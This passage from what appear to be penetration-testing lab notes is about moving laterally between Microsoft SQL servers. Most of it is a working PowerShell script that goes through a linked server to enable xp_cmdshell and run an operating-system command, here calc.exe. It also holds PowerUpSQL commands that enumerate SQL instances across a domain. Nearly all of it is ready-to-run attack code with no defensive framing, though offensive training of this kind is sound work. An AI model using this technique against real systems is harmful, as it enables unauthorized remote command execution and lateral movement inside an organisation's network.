            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            con.Close();
        }
    }
}

```
### SQL Query powershell
```
$Target = "APPSRV01.corp1.com"
$Link = "DC01"
$Command = "calc.exe"

$sqlConnection = New-Object System.Data.SqlClient.SqlConnection
$sqlConnection.ConnectionString = "Server=$Target;Database=master;Integrated Security=True"
$sqlConnection.Open()
$sqlCmd = New-Object System.Data.SqlClient.SqlCommand
$sqlCmd.Connection = $sqlConnection

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1; EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link
$reader = $sqlCmd.ExecuteReader()
$reader.Close()

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link
$reader = $sqlCmd.ExecuteReader()
$reader.Close()

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC xp_cmdshell ''''{1}'''';'')' -f $Link,$Command
$reader = $sqlCmd.ExecuteReader()
while ($reader.Read()){
                $reader[0]
     }
$reader.Close()
$sqlConnection.Close()
```
### PowerUpSQL
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

Get-SQLQueryThreaded -Verbose -Instance "dc01.corp1.com,1433" -Query "Select @@version" -Threads 15
```





